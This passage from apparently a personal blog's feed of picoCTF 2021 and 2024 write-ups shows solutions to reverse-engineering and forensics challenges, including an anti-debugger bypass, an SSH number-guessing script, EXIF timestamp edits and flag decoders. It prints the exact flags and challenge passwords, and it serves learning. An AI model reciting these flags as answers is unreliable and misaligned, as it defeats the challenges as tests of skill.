function">FUN_004013b0</span><span class="token punctuation">(</span>DAT_00405408<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lpOutputString <span class="token operator">==</span> <span class="token punctuation">(</span>LPWSTR<span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"### Something went wrong...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"### Good job! Here\'s your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"### ~~~ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>lpOutputString<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>                            L<span class="token string">"### (Note: The flag could become corrupted if the process state is tam pered with in any way.)\n\n"</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">free</span><span class="token punctuation">(</span>lpOutputString<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>                          L<span class="token string">"### Oops! The debugger was detected. Try to bypass this check to get the  flag!\n"</span>                          <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">free</span><span class="token punctuation">(</span>DAT_00405410<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">OutputDebugStringW</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然後設斷點在006C1602然後執行</p><img src="/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100/image.png" class=""><p>把EAX的值改成0再執行</p><img src="/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100/image-1.png" class=""><p>到日誌畫面就看到flag了</p><img src="/CTF/picoCTF2024/Reverse/WinAntiDbg0x100/WinAntiDbg0x100/image-2.png" class=""><p>flag:<code>picoCTF&#123;d3bug_f0r_th3_Win_0x100_17712291&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> picoCTF2024 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Binary Search</title>
      <link href="/CTF/picoCTF2024/Forensic/Binary%20Search/Binary%20Search/"/>
      <url>/CTF/picoCTF2024/Forensic/Binary%20Search/Binary%20Search/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> paramiko<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">binary_search_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Define connection details</span>    hostname <span class="token operator">=</span> <span class="token string">"atlas.picoctf.net"</span>    port <span class="token operator">=</span> <span class="token number">51887</span>    username <span class="token operator">=</span> <span class="token string">"ctf-player"</span>    password <span class="token operator">=</span> <span class="token string">"83dcefb7"</span>  <span class="token comment"># Replace this with your actual password</span>    <span class="token comment"># Initialize the SSH client</span>    client <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    client<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># Connect to the server</span>        client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">)</span>        ssh <span class="token operator">=</span> client<span class="token punctuation">.</span>invoke_shell<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Read initial welcome message</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># Give it a second to receive the full message</span>        ssh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token comment"># Initialize the binary search range</span>        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># Calculate the mid-point</span>            guess <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            ssh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>guess<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>            <span class="token comment"># Wait and receive feedback from the server</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># Give it a moment to process and send back the response</span>            output <span class="token operator">=</span> ssh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Higher"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>                low <span class="token operator">=</span> guess <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">elif</span> <span class="token string">"Lower"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>                high <span class="token operator">=</span> guess <span class="token operator">-</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>  <span class="token comment"># If the feedback is neither "Higher" nor "Lower", we assume the game is over</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        <span class="token comment"># Close the SSH connection</span>        client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    binary_search_game<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">~/CTF/picoCTF2024/forensic/Binary Search/home/ctf-player/drop-in                                            4s <span class="token operator">|</span> 06:27:03<span class="token operator">></span> python3 sol.py<span class="token number">500</span>Higher<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">750</span>Lower<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">625</span>Lower<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">562</span>Higher<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">593</span>Lower<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">577</span>Higher<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">585</span>Lower<span class="token operator">!</span> Try again.Enter your guess:<span class="token number">581</span>Congratulations<span class="token operator">!</span> You guessed the correct number: <span class="token number">581</span>Here's your flag: picoCTF<span class="token punctuation">&#123;</span>g00d_gu355_ee8225d0<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag:<code>picoCTF&#123;g00d_gu355_ee8225d0&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2024 Forensic - Blast from the past</title>
      <link href="/CTF/picoCTF2024/Forensic/Blast%20from%20the%20past/Blast%20from%20the%20past/"/>
      <url>/CTF/picoCTF2024/Forensic/Blast%20from%20the%20past/Blast%20from%20the%20past/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">❯ exiftool <span class="token parameter variable">-SubSecCreateDate</span><span class="token operator">=</span><span class="token string">'1970:01:01 00:00:00.001'</span> <span class="token parameter variable">-SubSecDateTimeOriginal</span><span class="token operator">=</span><span class="token string">'1970:01:01 00:00:00.001'</span> <span class="token parameter variable">-SubSecModifyDate</span><span class="token operator">=</span><span class="token string">'1970:01:01 00:00:00.001'</span> original_modified2.jpg    <span class="token number">1</span> image files updated<span class="token punctuation">[</span><span class="token number">20</span>:47<span class="token punctuation">]</span>  <span class="token function">zsh</span>   ≢                                                                                                   356ms /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Forensic/Blast from the past❯ exiftool ./original_modified2.jpgExifTool Version Number         <span class="token builtin class-name">:</span> <span class="token number">12.40</span>File Name                       <span class="token builtin class-name">:</span> original_modified2.jpgDirectory                       <span class="token builtin class-name">:</span> <span class="token builtin class-name">.</span>File Size                       <span class="token builtin class-name">:</span> <span class="token number">2.7</span> MiBFile Modification Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:06 <span class="token number">20</span>:47:39+08:00File Access Date/Time           <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:06 <span class="token number">20</span>:47:41+08:00File Inode Change Date/Time     <span class="token builtin class-name">:</span> <span class="token number">2024</span>:09:06 <span class="token number">20</span>:47:39+08:00File Permissions                <span class="token builtin class-name">:</span> <span class="token parameter variable">-rwxrwxrwx</span>File Type                       <span class="token builtin class-name">:</span> JPEGFile Type Extension             <span class="token builtin class-name">:</span> jpgMIME Type                       <span class="token builtin class-name">:</span> image/jpegExif Byte Order                 <span class="token builtin class-name">:</span> Little-endian <span class="token punctuation">(</span>Intel, II<span class="token punctuation">)</span>Image Description               <span class="token builtin class-name">:</span>Make                            <span class="token builtin class-name">:</span> samsungCamera Model Name               <span class="token builtin class-name">:</span> SM-A326UOrientation                     <span class="token builtin class-name">:</span> Rotate <span class="token number">90</span> CWX Resolution                    <span class="token builtin class-name">:</span> <span class="token number">72</span>Y Resolution                    <span class="token builtin class-name">:</span> <span class="token number">72</span>Resolution Unit                 <span class="token builtin class-name">:</span> inchesSoftware                        <span class="token builtin class-name">:</span> MediaTek Camera ApplicationModify Date                     <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00Y Cb Cr Positioning             <span class="token builtin class-name">:</span> Co-sitedExposure Time                   <span class="token builtin class-name">:</span> <span class="token number">1</span>/24F Number                        <span class="token builtin class-name">:</span> <span class="token number">1.8</span>Exposure Program                <span class="token builtin class-name">:</span> Program AEISO                             <span class="token builtin class-name">:</span> <span class="token number">500</span>Sensitivity Type                <span class="token builtin class-name">:</span> UnknownRecommended Exposure Index      <span class="token builtin class-name">:</span> <span class="token number">0</span>Exif Version                    <span class="token builtin class-name">:</span> 0220Date/Time Original              <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00Create Date                     <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00Components Configuration        <span class="token builtin class-name">:</span> Y, Cb, Cr, -Shutter Speed Value             <span class="token builtin class-name">:</span> <span class="token number">1</span>/24Aperture Value                  <span class="token builtin class-name">:</span> <span class="token number">1.9</span>Brightness Value                <span class="token builtin class-name">:</span> <span class="token number">3</span>Exposure Compensation           <span class="token builtin class-name">:</span> <span class="token number">0</span>Max Aperture Value              <span class="token builtin class-name">:</span> <span class="token number">1.8</span>Metering Mode                   <span class="token builtin class-name">:</span> Center-weighted averageLight Source                    <span class="token builtin class-name">:</span> OtherFlash                           <span class="token builtin class-name">:</span> On, FiredFocal Length                    <span class="token builtin class-name">:</span> <span class="token number">4.6</span> mmSub Sec Time                    <span class="token builtin class-name">:</span> 001Sub Sec Time Original           <span class="token builtin class-name">:</span> 001Sub Sec Time Digitized          <span class="token builtin class-name">:</span> 001Flashpix Version                <span class="token builtin class-name">:</span> 0100Color Space                     <span class="token builtin class-name">:</span> sRGBExif Image Width                <span class="token builtin class-name">:</span> <span class="token number">4000</span>Exif Image Height               <span class="token builtin class-name">:</span> <span class="token number">3000</span>Interoperability Index          <span class="token builtin class-name">:</span> R98 - DCF basic <span class="token function">file</span> <span class="token punctuation">(</span>sRGB<span class="token punctuation">)</span>Interoperability Version        <span class="token builtin class-name">:</span> 0100Exposure Mode                   <span class="token builtin class-name">:</span> AutoWhite Balance                   <span class="token builtin class-name">:</span> AutoDigital Zoom Ratio              <span class="token builtin class-name">:</span> <span class="token number">1</span>Focal Length In 35mm Format     <span class="token builtin class-name">:</span> <span class="token number">25</span> mmScene Capture Type              <span class="token builtin class-name">:</span> StandardCompression                     <span class="token builtin class-name">:</span> JPEG <span class="token punctuation">(</span>old-style<span class="token punctuation">)</span>Thumbnail Offset                <span class="token builtin class-name">:</span> <span class="token number">1124</span>Thumbnail Length                <span class="token builtin class-name">:</span> <span class="token number">64000</span>Image Width                     <span class="token builtin class-name">:</span> <span class="token number">4000</span>Image Height                    <span class="token builtin class-name">:</span> <span class="token number">3000</span>Encoding Process                <span class="token builtin class-name">:</span> Baseline DCT, Huffman codingBits Per Sample                 <span class="token builtin class-name">:</span> <span class="token number">8</span>Color Components                <span class="token builtin class-name">:</span> <span class="token number">3</span>Y Cb Cr Sub Sampling            <span class="token builtin class-name">:</span> YCbCr4:2:0 <span class="token punctuation">(</span><span class="token number">2</span> <span class="token number">2</span><span class="token punctuation">)</span>Time Stamp                      <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 08:00:00+08:00MCC Data                        <span class="token builtin class-name">:</span> <span class="token number">310</span>Aperture                        <span class="token builtin class-name">:</span> <span class="token number">1.8</span>Image Size                      <span class="token builtin class-name">:</span> 4000x3000Megapixels                      <span class="token builtin class-name">:</span> <span class="token number">12.0</span>Scale Factor To <span class="token number">35</span> mm Equivalent: <span class="token number">5.4</span>Shutter Speed                   <span class="token builtin class-name">:</span> <span class="token number">1</span>/24Create Date                     <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00.001Date/Time Original              <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00.001Modify Date                     <span class="token builtin class-name">:</span> <span class="token number">1970</span>:01:01 00:00:00.001Thumbnail Image                 <span class="token builtin class-name">:</span> <span class="token punctuation">(</span>Binary data <span class="token number">64000</span> bytes, use <span class="token parameter variable">-b</span> option to extract<span class="token punctuation">)</span>Circle Of Confusion             <span class="token builtin class-name">:</span> <span class="token number">0.006</span> mmField Of View                   <span class="token builtin class-name">:</span> <span class="token number">71.5</span> degFocal Length                    <span class="token builtin class-name">:</span> <span class="token number">4.6</span> mm <span class="token punctuation">(</span><span class="token number">35</span> mm equivalent: <span class="token number">25.0</span> mm<span class="token punctuation">)</span>Hyperfocal Distance             <span class="token builtin class-name">:</span> <span class="token number">2.13</span> mLight Value                     <span class="token builtin class-name">:</span> <span class="token number">4.0</span><span class="token punctuation">[</span><span class="token number">20</span>:47<span class="token punctuation">]</span>  <span class="token function">zsh</span>   ≢                                                                                                    65ms /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Forensic/Blast from the past❯ <span class="token function">nc</span> <span class="token parameter variable">-w</span> <span class="token number">2</span> mimas.picoctf.net <span class="token number">55566</span> <span class="token operator">&lt;</span> original_modified2.jpg<span class="token punctuation">[</span><span class="token number">20</span>:47<span class="token punctuation">]</span>  <span class="token function">zsh</span>   ≢                                                                                                3s 654ms /mnt/c/Users/LuYee6813/OneDrive - gapps.ntust.edu.tw/OneDrive/筆記/blog/LuYee6813.github.io/source/_posts/CTF/picoCTF2024/Forensic/Blast from the past❯ <span class="token function">nc</span> mimas.picoctf.net <span class="token number">54145</span>MD5 of your picture:412331ca77b633d2529dc0e0ab5ad6eb  test.outChecking tag <span class="token number">1</span>/7Looking at IFD0: ModifyDateLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00'</span>Found: <span class="token number">1970</span>:01:01 00:00:00Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">2</span>/7Looking at ExifIFD: DateTimeOriginalLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00'</span>Found: <span class="token number">1970</span>:01:01 00:00:00Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">3</span>/7Looking at ExifIFD: CreateDateLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00'</span>Found: <span class="token number">1970</span>:01:01 00:00:00Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">4</span>/7Looking at Composite: SubSecCreateDateLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00.001'</span>Found: <span class="token number">1970</span>:01:01 00:00:00.001Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">5</span>/7Looking at Composite: SubSecDateTimeOriginalLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00.001'</span>Found: <span class="token number">1970</span>:01:01 00:00:00.001Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">6</span>/7Looking at Composite: SubSecModifyDateLooking <span class="token keyword">for</span> <span class="token string">'1970:01:01 00:00:00.001'</span>Found: <span class="token number">1970</span>:01:01 00:00:00.001Great job, you got that one<span class="token operator">!</span>Checking tag <span class="token number">7</span>/7Timezones <span class="token keyword">do</span> not have to match, as long as it<span class="token string">'s the equivalent time.Looking at Samsung: TimeStampLooking for '</span><span class="token number">1970</span>:01:01 00:00:00.001+00:00'Found: <span class="token number">1970</span>:01:01 00:00:00.001+00:00Great job, you got that one<span class="token operator">!</span>You did it<span class="token operator">!</span>picoCTF<span class="token punctuation">&#123;</span>71m3_7r4v311ng_p1c7ur3_3e336564<span class="token punctuation">&#125;</span>^C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF2024 </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF 2021 reverse write-up</title>
      <link href="/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/"/>
      <url>/CTF/picoCTF/All-Write-Up/picoCTF2021-Reverse/picoCTF2021-Reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="Transformation-20-points"><a href="#Transformation-20-points" class="headerlink" title="Transformation [20 points]"></a>Transformation [20 points]</h1><p>題目給了加密的方法為：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寫一個程式把它解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">encode_flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"enc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>encode_flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    character1 <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>encode_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    character2 <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>encode_flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16be'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> character1    flag <span class="token operator">+=</span> character2<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;16_bits_inst34d_of_8_26684c20&#125;</code></p><h1 id="keygenme-py-30-points"><a href="#keygenme-py-30-points" class="headerlink" title="keygenme-py [30 points]"></a>keygenme-py [30 points]</h1><p>從source code中看到已經有一部分flag，看起來是要找出 key_part_dynamic1_trial</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key_part_static1_trial <span class="token operator">=</span> <span class="token string">"picoCTF&#123;1n_7h3_|&lt;3y_of_"</span>key_part_dynamic1_trial <span class="token operator">=</span> <span class="token string">"xxxxxxxx"</span>key_part_static2_trial <span class="token operator">=</span> <span class="token string">"&#125;"</span>key_full_template_trial <span class="token operator">=</span> key_part_static1_trial <span class="token operator">+</span> key_part_dynamic1_trial <span class="token operator">+</span> key_part_static2_trial<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把username拿去sha256後取4,5,3,6,2,7,1,8</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibflag_part1 <span class="token operator">=</span> <span class="token string">"picoCTF&#123;1n_7h3_|&lt;3y_of_"</span>flag_part2 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token string">b"GOUGH"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>flag_part3 <span class="token operator">=</span> <span class="token string">"&#125;"</span>flag <span class="token operator">=</span> flag_part1 <span class="token operator">+</span> flag_part2 <span class="token operator">+</span> flag_part3<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Flag: picoCTF&#123;1n_7h3_|&lt;3y_of_f911a486&#125;</code></p><h1 id="crackme-py-30-points"><a href="#crackme-py-30-points" class="headerlink" title="crackme-py [30 points]"></a>crackme-py [30 points]</h1><p>這題看完source code後發現他已經有寫好的function只是沒有使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode_secret</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""ROT47 decode    NOTE: encode and decode are the same operation in the ROT cipher family.    """</span>    <span class="token comment"># Encryption key</span>    rotate_const <span class="token operator">=</span> <span class="token number">47</span>    <span class="token comment"># Storage for decoded secret</span>    decoded <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># decode loop</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> secret<span class="token punctuation">:</span>        index <span class="token operator">=</span> alphabet<span class="token punctuation">.</span>find<span class="token punctuation">(</span>c<span class="token punctuation">)</span>        original_index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> rotate_const<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span>        decoded <span class="token operator">=</span> decoded <span class="token operator">+</span> alphabet<span class="token punctuation">[</span>original_index<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-console" data-language="console"><code class="language-console">┌──(luyee㉿DESKTOP-KADOGNG)-[~&#x2F;picoCTF]└─$ &#x2F;bin&#x2F;python3 &#x2F;home&#x2F;luyee&#x2F;picoCTF&#x2F;2021&#x2F;reverse&#x2F;crackme-py&#x2F;crackme.pyWhat&#39;s your first number? 123What&#39;s your second number? 123The number with largest positive magnitude is 123picoCTF&#123;1|\&#x2F;|_4_p34|\|ut_4593da8a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以直接拿來用，Flag就出來了＠＠</p><p><code>Flag: picoCTF&#123;1|\/|_4_p34|\|ut_4593da8a&#125;</code></p><h1 id="ARMssembly-0-40-points"><a 